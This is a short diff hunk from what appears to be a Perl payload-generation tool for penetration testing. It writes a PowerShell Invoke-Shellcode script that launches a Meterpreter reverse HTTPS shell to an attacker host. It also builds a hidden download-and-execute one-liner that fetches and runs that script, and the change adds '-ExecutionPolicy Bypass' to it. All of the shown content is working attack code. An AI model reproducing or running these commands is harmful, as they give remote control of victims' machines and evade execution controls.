@@ -562,7 +562,7 @@ RHTTPSNOENC
   $scriptName = "202-Invoke-Shellcode.ps1";
   `cp $ShellCodePath $targetFolder/$scriptName`;
   `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/$scriptName`;
-  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/$scriptName'))";
+  $cmd = "powershell.exe -ExecutionPolicy Bypass -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/$scriptName'))";
   $scriptName = "201_PScommand.txt";
   open( $OUTFILE, '>', "$targetFolder/$scriptName");
   print $OUTFILE $cmd;
